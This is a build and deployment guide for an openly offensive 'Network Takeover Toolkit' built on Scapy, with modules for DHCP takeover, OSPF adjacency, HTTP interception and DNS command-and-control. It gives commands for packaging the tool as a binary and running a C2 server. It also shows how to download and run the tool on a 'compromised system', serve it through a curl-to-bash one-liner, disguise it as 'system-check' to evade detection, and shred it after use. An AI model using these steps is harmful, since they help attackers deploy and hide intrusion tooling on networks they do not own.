# Network Takeover Toolkit - Executable Build Guide

## Overview

This guide describes how to package the toolkit into a standalone Linux executable that requires no additional downloads or Python installation.

## Build Methods

### Method 1: PyInstaller (Recommended - Easiest)

**Advantages:**
- Single self-contained binary
- Works on any Linux system with glibc
- No Python required on target
- Includes all dependencies (Scapy, etc.)

**Requirements:**
- Python 3.8+
- PyInstaller: `pip install pyinstaller`
- Linux build system (must match target architecture)

**Build Steps:**

```bash
cd scapy/final

# Install PyInstaller if not already installed
pip install pyinstaller

# Run the automated build script
python3 build_executable.py

# Navigate to build directory and create the executable
cd build_toolkit
pyinstaller netsec_toolkit.spec

# The executable will be in: dist/netsec-toolkit
```

**Output:**
- Binary location: `build_toolkit/dist/netsec-toolkit`
- Size: ~120-150 MB (stripped x86_64)
- Format: ELF binary for Linux

**Deployment:**

```bash
# Copy to target system (e.g., Kali Linux)
scp build_toolkit/dist/netsec-toolkit user@target:/tmp/

# On target system
cd /tmp
chmod +x netsec-toolkit
sudo ./netsec-toolkit [--remote] [--demo]
```

---

### Method 2: PyInstaller with UPX Compression (Smaller Binary)

**Advantages:**
- Smaller executable (~40-50 MB)
- Same functionality as Method 1

**Requirements:**
- PyInstaller
- UPX: `sudo apt install upx` (Linux) or `brew install upx` (macOS)

**Build Steps:**

```bash
cd scapy/final/build_toolkit
# UPX is configured in the spec file, so just run:
pyinstaller netsec_toolkit.spec --onefile --upx-dir=/usr/bin
```

---

### Method 3: Self-Extracting Archive (Most Portable)

**Advantages:**
- Works on older Linux systems
- Can include source and compiled modules
- Self-extracts on first run

**Build Steps:**

```bash
cd scapy/final

# Create a release archive
mkdir -p release/netsec-toolkit
cp main.py dhcp_takeover.py ospf_adjacency.py vpn_relay.py http_intercept.py dns_c2.py release/netsec-toolkit/

# Create self-extracting wrapper
cat > release/netsec-toolkit-deploy.sh << 'EOF'
#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXTRACT_DIR="${EXTRACT_DIR:-/tmp/netsec-toolkit-$$}"
ARCHIVE_LINE=$(awk '/^__ARCHIVE_BELOW__/ { print NR + 1; exit }' "$0")

mkdir -p "$EXTRACT_DIR"
tail -n +$ARCHIVE_LINE "$0" | tar xz -C "$EXTRACT_DIR"

cd "$EXTRACT_DIR"
exec python3 -m main "$@"

exit 1

__ARCHIVE_BELOW__
EOF

# Append the tar archive
tar czf - netsec-toolkit >> release/netsec-toolkit-deploy.sh
chmod +x release/netsec-toolkit-deploy.sh
```

---

### Method 4: Docker Container (For Reproducible Deployments)

**Advantages:**
- Guaranteed consistency across systems
- Can be deployed to any Docker-enabled Linux

**Create Dockerfile:**

```dockerfile
FROM kalilinux/kali-rolling

RUN apt-get update && apt-get install -y \
    python3 \
    python3-scapy \
    iptables \
    iproute2 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /opt/toolkit

COPY main.py dhcp_takeover.py ospf_adjacency.py vpn_relay.py http_intercept.py dns_c2.py ./

ENTRYPOINT ["python3", "main.py"]
CMD ["--demo"]
```

**Build & Deploy:**

```bash
docker build -t netsec-toolkit:latest .
docker run --rm --privileged --net=host netsec-toolkit:latest --demo
```

---

## Executable Specifications

### Build Output

```
netsec-toolkit (PyInstaller Binary)
├── Architecture: x86_64 (Intel/AMD 64-bit)
├── Format: ELF binary
├── Size: ~130 MB (uncompressed) / ~50 MB (with UPX)
├── Dependencies: glibc 2.17+ (most Linux systems have this)
├── Libc: Any modern libc (glibc, musl, etc.)
└── Kernel: 3.10+ (most enterprise/cloud Linux)
```

### Runtime Requirements

**On Target System:**
- OS: Linux (any distribution)
- Architecture: x86_64 (Intel/AMD)
- libc: glibc 2.17+ (or musl/other)
- Privileges: root (for raw sockets, iptables, routing)
- Interface: At least 1 network interface
- Kernel modules: iptables, netfilter (built into modern kernels)

**NOT Required:**
- Python installation
- pip packages
- Source code
- Compilers

---

## Running the Executable

### Basic Usage

```bash
# From the build output directory
sudo ./netsec-toolkit [OPTIONS]

# Options:
#   --remote / -r    Enable DNS C2 mode (requires c2_server running)
#   --demo           Pause at each phase with verification hints
```

### Example Deployments

**Scenario 1: Local Testing**
```bash
cd build_toolkit/dist
sudo ./netsec-toolkit --demo
```

**Scenario 2: Remote Deployment via SSH**
```bash
# On build machine
scp build_toolkit/dist/netsec-toolkit attacker@target-kali:/tmp/

# On target
ssh attacker@target-kali
sudo /tmp/netsec-toolkit --remote --demo
```

**Scenario 3: C2 Server Deployment**
```bash
# On C2 server (separate machine)
python3 scapy/final/c2_server.py --domain d.lootforge.org --port 53

# On agent (runs the executable)
sudo ./netsec-toolkit --remote
```

---

## Verification

### Check Executable Integrity

```bash
# Verify the binary is complete
file build_toolkit/dist/netsec-toolkit
# Output: ELF 64-bit LSB executable, x86-64, ...

# Check size
ls -lh build_toolkit/dist/netsec-toolkit

# Test extract (PyInstaller bundles are extractable)
cd /tmp
mkdir test-extract
cd test-extract
..../netsec-toolkit --help 2>&1 | head -5
```

### Test Before Production Deployment

```bash
# 1. Verify on a test system (same OS/kernel as production)
sudo ./netsec-toolkit --demo

# 2. Capture output logs
sudo ./netsec-toolkit --demo > deployment_test.log 2>&1

# 3. Verify all modules loaded (check logs for import errors)
grep -i "error\|failed\|import" deployment_test.log

# 4. Test basic networking commands work
sudo ./netsec-toolkit --help
sudo ip route show
sudo iptables -L
```

---

## Troubleshooting

### Binary won't execute

```bash
# Make sure it's executable
chmod +x netsec-toolkit

# Check if it's the right architecture
file netsec-toolkit
uname -m  # Should both be x86_64

# Try to run directly
./netsec-toolkit
# If it fails, check system libraries:
ldd ./netsec-toolkit
```

### Module import errors

```bash
# The binary includes Scapy, so this shouldn't happen
# If it does, rebuild with:
pyinstaller netsec_toolkit.spec --clean
```

### Permission denied

```bash
# Must run as root
sudo ./netsec-toolkit

# Or add to sudoers (not recommended for security)
sudo visudo
# Add: user ALL=(ALL) NOPASSWD: /path/to/netsec-toolkit
```

### Network interface not found

```bash
# Edit DEFAULT_INTERFACE before building, or
# Pass as environment variable at runtime:
DEFAULT_INTERFACE=eth0 sudo ./netsec-toolkit
```

---

## Distribution

### Option A: Release to GitHub

```bash
# Create release tarball
tar czf netsec-toolkit-linux-x86_64.tar.gz build_toolkit/dist/netsec-toolkit

# Create GitHub release with binary
gh release create v1.0 netsec-toolkit-linux-x86_64.tar.gz
```

### Option B: Deploy to Repository

```bash
# Create a repository for automated deployment
mkdir -p repo/netsec-toolkit/latest
cp build_toolkit/dist/netsec-toolkit repo/netsec-toolkit/latest/
echo "$(date -u +%Y-%m-%dT%H:%M:%SZ)" > repo/netsec-toolkit/latest/BUILD_DATE

# Serve via HTTP for one-line deployment:
# sudo curl -fsSL https://repo.example.com/netsec-toolkit/latest/netsec-toolkit | bash
```

### Option C: Embedded in Red Team Infrastructure

```bash
# Store in C2 infrastructure for agent deployment
# Reference: scripts/deploy_agent.sh

# Drop and execute on compromised system:
wget -O /tmp/toolkit http://c2-server/netsec-toolkit
chmod +x /tmp/toolkit
/tmp/toolkit --remote
```

---

## Security Considerations

### Signing & Verification

```bash
# Sign the binary
gpg --detach-sign build_toolkit/dist/netsec-toolkit

# Verify on target
gpg --verify netsec-toolkit.sig netsec-toolkit
```

### Detection Evasion

- Binary is named `netsec-toolkit` (detectable)
- Rename before deployment: `mv netsec-toolkit system-check`
- Strip symbols: `strip netsec-toolkit` (already done by PyInstaller)
- Compress: `upx --best netsec-toolkit` (already done in spec)

### Safe Deletion

```bash
# Securely remove after use
shred -vfz -n 3 /tmp/netsec-toolkit
```

---

## Performance

### Startup Time

- PyInstaller binary: ~2-5 seconds (first run, unpacks)
- Subsequent runs: ~1-2 seconds (cached)

### Memory Usage

- Base runtime: ~50 MB
- During operation: ~150-250 MB (depends on traffic volume)

### Network Impact

- Passive OSPF sniffing: <1% CPU, minimal bandwidth
- Active OSPF adjacency: ~5-10% CPU during setup
- DHCP relay: variable (depends on victim traffic)
- HTTP interception: CPU scales with traffic

---

## Building on Different Architectures

### For ARM64 (Raspberry Pi, mobile)

```bash
# Build on ARM64 system
python3 build_executable.py
cd build_toolkit
pyinstaller netsec_toolkit.spec
# Output: dist/netsec-toolkit (ARM64)
```

### For i386 (Legacy 32-bit)

```bash
# Requires 32-bit Python and libraries
python3-32bit build_executable.py
# May not work - Scapy has limited 32-bit support
```

---

## Next Steps

1. **Build the executable**: `python3 build_executable.py && cd build_toolkit && pyinstaller netsec_toolkit.spec`
2. **Test on staging**: Deploy to test Kali VM, verify all modules
3. **Sign & document**: GPG sign, create deployment runbook
4. **Deploy**: Use chosen distribution method (GitHub, HTTP, Docker, etc.)

